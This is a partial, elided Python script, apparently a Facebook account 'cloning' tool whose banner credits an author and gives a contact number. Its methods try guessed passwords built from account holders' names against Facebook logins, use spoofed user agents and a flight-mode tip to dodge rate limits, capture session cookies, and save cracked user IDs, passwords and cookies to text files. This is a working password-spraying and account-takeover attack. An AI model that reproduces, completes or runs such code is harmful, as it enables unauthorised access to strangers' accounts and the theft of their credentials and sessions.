...
def randBuildLSB():
    ...
    ua = f'Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5616.208 Safari/537.36'+END
    return ua
#<------[main-ua]---->
def AHMEDfile():
...
\33[1;37m----------------------------------------------
   𝐎𝐖𝐄𝐍𝐄𝐑    :  𝐀𝐇𝐌𝐄𝐃 𝐆𝐔𝐉𝐉𝐀𝐑 
   𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊  :  𝐀𝐇𝐌𝐄𝐃 𝐆𝐔𝐉𝐉𝐀𝐑
   𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  :  03102847797
   𝐆𝐈𝐓𝐇𝐔𝐁    :  𝐀𝐊-47
   𝐓𝐎𝐎𝐋 𝐓𝐘𝐏𝐄 :  𝐅𝐢𝐥𝐞+𝐑𝐚𝐧𝐝𝐨𝐦
   𝐒𝐓𝐀𝐓𝐔𝐒    :  𝐅𝐑𝐄𝐄
   𝐕𝐄𝐑𝐒𝐈𝐎𝐍   :  0.3
\33[1;37m----------------------------------------------""")
def clear():
...
#<----[pass_list]------>           
    def pasw(self):       
            ...
            print(f'\x1b[1;91m[•] Use Flight Mode For Better Result')
            linex()
...
#<-----[Method~1]---->            
    def method1(self, uid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\x1b[1;97m[Mr.Ahmed_XD] {loop}|{len(self.id)} \x1b[1;92mOK:-{len(oks)} {''.format(loop/float(len(self.id)))}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f'\r\r\x1b[1;92m[AHMED.OK] {uid} | {ps}\033[1;97m')
                    oks.append(uid)
                    open('/sdcard/AHMED.OK.txt','a').write(uid+'|'+ps+'\n');open('/sdcard/REFAT_iDs_COOKiES_M1.txt','a').write(uid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f'\r\r\x1b[1;91m[AHMED.XD-CP] {uid} | {ps}\033[1;97m')
                     cps.append(uid)
                     open('/sdcard/AHMED.XD-CP.txt','a').write(uid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def method3(self, uid, name, psw):
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);rsbhai = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"fh={rsbhai};{ckkk}"
                    print(f'\r\r\x1b[1;91m[AHMED.OK] {uid} | {ps}\033[1;97m')
                    oks.append(uid)
                    open('/sdcard/AHMED.OK.txt','a').write(uid+'|'+ps+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
...
def AHMEDcp():
    ...
    print(' Ids saved in AHMED.OK.txt,in cp AHMED.XD-CP.txt')
    linex()
    input(' Press Enter to Back')    
    os.system('python Mr.Ahmed_XD.py')
#<------[Cloning]------>
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[141:156]
                print('\033[1;31m[AHMED.XD-CP] '+uid+' | '+ps+'\033[0;97m')
                open('/sdcard/AHMED.XD-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(uid)
                break
            else:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in AHMED:
                                ...
                                if 'y' in pcp:
                                        open('/sdcard/AHMED.XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in AHMED:
                                ...
                                if 'y' in pcp:
                                        open('/sdcard/CP-AHMED.XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
